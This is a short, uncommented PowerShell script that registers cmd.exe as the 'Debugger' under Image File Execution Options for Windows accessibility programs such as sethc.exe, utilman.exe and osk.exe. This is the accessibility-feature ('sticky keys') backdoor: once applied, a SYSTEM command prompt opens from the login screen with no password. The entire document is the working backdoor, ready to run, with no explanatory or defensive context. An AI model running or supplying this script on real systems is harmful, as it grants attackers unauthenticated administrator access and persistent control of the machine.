$input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
$Name = "Debugger"
$Value = "C:\windows\system32\cmd.exe"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}